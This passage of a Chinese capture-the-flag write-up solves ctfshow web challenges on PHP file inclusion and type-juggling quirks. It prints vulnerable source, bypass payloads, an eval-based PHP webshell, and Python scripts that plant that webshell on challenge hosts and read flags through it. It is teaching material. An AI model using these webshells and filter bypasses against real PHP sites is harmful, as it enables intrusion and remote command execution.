<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>倒是变得简单了，过滤了php，但没过滤data，所以使用data伪协议，但因为过滤了php所以我们使用base64编码一下<br>
payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4</span><br></pre></td></tr></table></figure>
<h3 id="web116"><a class="header-anchor" href="#web116">¶</a>web116</h3>
<p>题目提示是lfi，也就是php本地文件包含漏洞，打开题目，是一个视频，是港片电影合集的混剪，饶有兴趣的看完了😆<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web116/2%7D%40E%5DTLC4S_U0C8%28UEZ%25UWQ.png" alt=""><br>
直接试了一下file参数包含路径，就出来了源码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web116/Y%40VCXO2K%2556I%7BHVG%5D67F3%24B.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|data|input|rot13|base64|string|log|sess/i&#x27;</span>,$x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])?$_GET[<span class="string">&#x27;file&#x27;</span>]:<span class="string">&quot;5.mp4&quot;</span>;</span><br><span class="line">filter($file);</span><br><span class="line">header(<span class="string">&#x27;Content-Type: video/mp4&#x27;</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Length: <span class="subst">$file</span>&quot;</span>);</span><br><span class="line">readfile($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接包含flag就出来了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web116/9B%40%5B8%246KWLQ%60%5B%28WD~%5DU8%7D7A.png" alt=""></p>
<h3 id="web117"><a class="header-anchor" href="#web117">¶</a>web117</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,$x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">$contents=$_POST[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.$contents); </span><br></pre></td></tr></table></figure>
<p>这题和前面的有点类似，也是绕过contents前面的死亡代码，只是把一些可利用的协议和编码给ban了，但还可以利用其它编码器进行绕过</p>
<blockquote>
<p>convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用<br>
<code>iconv ( string $in_charset , string $out_charset , string $str )</code>：将字符串<code>$str</code>从<code>in_charset</code>编码转换到<code>$out_charset</code><br>
这里引入usc-2的概念，作用是对目标字符串每两位进行一反转，值得注意的是，因为是两位所以字符串需要保持在偶数位上</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;经过一次反转:&quot;</span>.$result.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;经过第二次反转:&quot;</span>.iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, $result);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果如下：</span></span><br><span class="line"><span class="comment">//经过一次反转:?&lt;hp pe@av(l_$OPTSd[tosa]t;)&gt;?</span></span><br><span class="line"><span class="comment">//经过第二次反转:<span class="meta">&lt;?php</span> @eval($_POST[dotast]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>可以看到，经过两次反转之后代码又组装回来，思路就是用经过一次反转后的webshell和死亡代码<code>&lt;?php die();?&gt;</code>一起组合之后，经过第二次反转我们的webshell就恢复正常了，而死亡代码会被反转打乱不能执行<br>
所以payload也就出来了，把前面的脚本改一下即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/21 12:29</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8a412388-9727-4ea0-8b0d-1f144f2d1a87.chall.ctf.show:8080/&quot;</span></span><br><span class="line">get_data = <span class="string">&quot;php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=dotast.php&quot;</span></span><br><span class="line">get_url = url + <span class="string">&quot;?file=&quot;</span> + get_data</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;contents&#x27;</span>: <span class="string">&#x27;?&lt;hp pe@av(l_$OPTSd[tosa]t;)&gt;?&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=get_url, data=data)</span><br><span class="line">shell_url = url + <span class="string">&quot;dotast.php&quot;</span></span><br><span class="line">test = requests.get(shell_url)</span><br><span class="line"><span class="keyword">if</span>(test.status_code == <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">&quot;[*]getshell成功&quot;</span>)</span><br><span class="line">    shell_data = &#123;</span><br><span class="line">        <span class="string">&#x27;dotast&#x27;</span>: <span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = requests.post(url=shell_url, data=shell_data)</span><br><span class="line">    print(result.text)</span><br></pre></td></tr></table></figure>
<p>运行后得到flag</p>
<h2 id="php特性-89-115-123-125-150"><a class="header-anchor" href="#php特性-89-115-123-125-150">¶</a>php特性(89-115&amp;123&amp;125-150)</h2>
<h3 id="web89"><a class="header-anchor" href="#web89">¶</a>web89</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>intval()</strong> 函数用于获取变量的整数值。</p>
<p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p>
</blockquote>
<p>首先第一个if判断有无参数num，第二个if正则匹配有没有数字，第三个if如果能为1的话，就可执行if里的语句，而intval函数用于object时会发生错误并返回1，所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num[]&#x3D;1</span><br></pre></td></tr></table></figure>
<h3 id="web90"><a class="header-anchor" href="#web90">¶</a>web90</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>继续考察intval的使用，多补充点知识</p>
<blockquote>
<p>int intval ( mixed $var [, int $base = 10 ] )</p>
<p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p>
<ul>
<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li>
<li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li>
<li>将使用 10 进制 (decimal)。</li>
</ul>
</blockquote>
<p>所以把4476转换成16进制，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;0x117c </span><br></pre></td></tr></table></figure>
<h3 id="web91"><a class="header-anchor" href="#web91">¶</a>web91</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>第一个if需要匹配到php，而第二个if如果匹配到php就会输出hacker，绕过需要不让它匹配到，这里有一个正则匹配的知识点</p>
<blockquote>
<p>/i表示匹配大小写<br>
字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾<br>
/m 多行匹配 若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配<br>
但是当出现换行符 <code>%0a</code>的时候，$cmd的值会被当做两行处理，而此时第二个if正则匹配不符合以php开头和以php结尾</p>
</blockquote>
<p>所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?cmd&#x3D;%0aphp</span><br><span class="line">或者</span><br><span class="line">?cmd&#x3D;php%0a%0a</span><br></pre></td></tr></table></figure>
<h3 id="web92"><a class="header-anchor" href="#web92">¶</a>web92</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>额，和90题一样，只是变成弱比较，一样使用十六进制绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;0x117c</span><br></pre></td></tr></table></figure>
<h3 id="web93"><a class="header-anchor" href="#web93">¶</a>web93</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了字母，那我们直接用小数点即可(利用php浮点数不能直接比较相等的特性)，或者8进制也行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;4476.1</span><br></pre></td></tr></table></figure>
<h3 id="web94"><a class="header-anchor" href="#web94">¶</a>web94</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次变成强比较，并且多加了一个strpos函数</p>
<blockquote>
<p><strong>strpos()</strong> 函数查找字符串在另一字符串中第一次出现的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strpos(string,find,start)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><em>string</em></td>
<td style="text-align:left">必需。规定要搜索的字符串。</td>
</tr>
<tr>
<td style="text-align:left"><em>find</em></td>
<td style="text-align:left">必需。规定要查找的字符串。</td>
</tr>
<tr>
<td style="text-align:left"><em>start</em></td>
<td style="text-align:left">可选。规定在何处开始搜索。</td>
</tr>
</tbody>
</table>
<p>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。</p>
<p><strong>注释</strong>：字符串位置从 0 开始，不是从 1 开始。</p>
</blockquote>
<p>因为八进制需要开头指定为0，而strpos()会匹配到返回0，!0也就是1得执行die，我们可以在前面加个空格，这样strpos()会返回1，所以我们把4476转换为8进制10574后，前面再加一个空格即可，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D; 010574</span><br></pre></td></tr></table></figure>
<h3 id="web95"><a class="header-anchor" href="#web95">¶</a>web95</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>换成弱比较了，一样使用上题payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D; 010574</span><br></pre></td></tr></table></figure>
<h3 id="web96"><a class="header-anchor" href="#web96">¶</a>web96</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file($_GET[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>读取文件，参数不等于flag.php，那直接加个<code>./</code>即可，有多种办法，php伪协议也可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?u&#x3D;.&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web97"><a class="header-anchor" href="#web97">¶</a>web97</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">		<span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">			<span class="keyword">echo</span> $flag;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>强比较md5类型题目，我刚好做过这个题型总结，师傅们可以去我的这篇文章看看https://www.wlhhlc.top/posts/16813/<br>
md5函数处理数组舒服会返回NULL，两个NULL即相等<br>
payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post：</span><br><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>
<h3 id="web98"><a class="header-anchor" href="#web98">¶</a>web98</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_GET?$_GET=&amp;$_POST:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">$_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$_GET=&amp;$_COOKIE:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">$_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$_GET=&amp;$_SERVER:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file($_GET[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$flag:<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
<p>这里是三目运算符和取地址，第二行和第三行是无用的，因为用不到，所以我们分析一下第一行和第四行</p>
<blockquote>
<p>第一行：如果存在get传参，则把post传参地址给get，可以简单理解为post覆盖了get<br>
第四行，如果get参数<code>HTTP_FLAG</code>的值为flag，就读取文件，也就是输出flag</p>
</blockquote>
<p>所以思路也就出来了，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;2</span><br><span class="line"></span><br><span class="line">post：</span><br><span class="line">HTTP_FLAG&#x3D;flag</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web98/V0DP3K7N%5BS%7BO%29LE%5B%40U%5DGTVY.png" alt=""></p>
<h3 id="web99"><a class="header-anchor" href="#web99">¶</a>web99</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$allow = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">36</span>; $i &lt; <span class="number">0x36d</span>; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(<span class="number">1</span>,$i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array($_GET[<span class="string">&#x27;n&#x27;</span>], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[<span class="string">&#x27;n&#x27;</span>], $_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>看一下代码，流程主要是先创建一个数组，接着往数组里添加rand()函数产生的随机数；<br>
第二个if判断是否存在get参数n，并且用in_array()在数组里搜索值<br>
最后用file_put_contents函数写数据到文件中</p>
<blockquote>
<p>in_array() 函数搜索数组中是否存在指定的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">in_array(search,<span class="keyword">array</span>,type)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><em>search</em></td>
<td style="text-align:left">必需。规定要在数组搜索的值。</td>
</tr>
<tr>
<td style="text-align:left"><em>array</em></td>
<td style="text-align:left">必需。规定要搜索的数组。</td>
</tr>
<tr>
<td style="text-align:left"><em>type</em></td>
<td style="text-align:left">可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</td>
</tr>
</tbody>
</table>
<p><strong>说明</strong></p>
<p>如果给定的值 <em>search</em> 存在于数组 <em>array</em> 中则返回 true。如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。</p>
<p>如果没有在数组中找到参数，函数返回 false。</p>
<p>注释：如果 <em>search</em> 参数是字符串，且 <em>type</em> 参数设置为 true，则搜索区分大小写。</p>
</blockquote>
<p>这里in_array()函数在没有第三个值得时候会进行弱比较，也就是存在强制转换，即123.php此时会被转换为123，所以payload如下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web99/KBDG%5DWII%28FDE%29DEI4%5D%25S%25DP.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web99/%28CW%29ZM3V7J0KRO199%5BX78%25M.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web99/H40KA9%25M2BPO3VLFDZ083_C.png" alt=""><br>
我喜欢用脚本跑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/23 18:43</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://5922e022-e938-4ec4-905f-0ccd7cf07cdf.chall.ctf.show:8080/&quot;</span></span><br><span class="line">w_url = url + <span class="string">&quot;?n=123.php&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">get_shell = requests.post(url=w_url, data=data1)</span><br><span class="line">shell_url = url + <span class="string">&quot;123.php&quot;</span></span><br><span class="line">get_test = requests.get(url=shell_url)</span><br><span class="line"><span class="keyword">if</span>(get_test.status_code==<span class="number">200</span>):</span><br><span class="line">    print(<span class="string">&quot;写入shell成功&quot;</span>)</span><br><span class="line">    data2=&#123;</span><br><span class="line">        <span class="string">&#x27;dotast&#x27;</span>: <span class="string">&#x27;system(&quot;cat flag36d.php&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=shell_url, data=data2)</span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure>
<p>运行后即可得到flag</p>
<h3 id="web100"><a class="header-anchor" href="#web100">¶</a>web100</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3=$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;/&quot;</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\;/&quot;</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>一共需要传三个get参数，然后<code>$vo</code>是对三个参数的与的结果，了解一下<code>s_numeric()</code>函数</p>
<blockquote>
<p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串<br>
如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE</p>
</blockquote>
<p>看到最后eval，肯定是需要命令执行，这需要<code>$v2</code>传入命令，<code>$v3</code>需要<code>;</code>结尾，但这么一来就变成了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$vo &#x3D; $v1 and FALSE and FAlse</span><br></pre></td></tr></table></figure>
<p>但php有运算的优先级，也就是<code>&amp;&amp;&gt; = &gt; and</code></p>
